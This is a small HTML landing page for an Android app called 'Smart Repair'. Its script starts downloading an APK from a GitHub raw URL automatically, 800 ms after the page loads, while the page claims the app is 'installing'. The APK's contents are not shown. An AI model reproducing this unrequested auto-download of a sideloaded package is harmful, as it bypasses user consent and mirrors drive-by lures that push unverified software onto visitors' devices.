<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Smart Repair Installer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #020617;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      max-width: 300px;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
    }

    p {
      color: #94a3b8;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .loader {
      border: 4px solid #1e293b;
      border-top: 4px solid #22c55e;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    .btn {
      background: #22c55e;
      border: none;
      padding: 10px 16px;
      color: white;
      font-size: 14px;
      border-radius: 6px;
      cursor: pointer;
    }

    .btn:hover {
      background: #16a34a;
    }
  </style>
</head>

<body>

<div class="container">
  <h1>Installing Smart Repair...</h1>
  <div class="loader"></div>
  <p>If download doesn't start, tap below</p>
  <button class="btn" onclick="downloadAPK()">Download APK</button>
</div>

<script>
  const apkUrl = "https://github.com/biz-rahul/RKP/raw/main/Z/App/Smart%20Repair.signed.apk";

  function downloadAPK() {
    const link = document.createElement("a");
    link.href = apkUrl;
    link.download = "SmartRepair.apk";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  // Auto download trigger
  window.onload = () => {
    setTimeout(downloadAPK, 800); // thoda delay for UX
  };
</script>

</body>
</html>
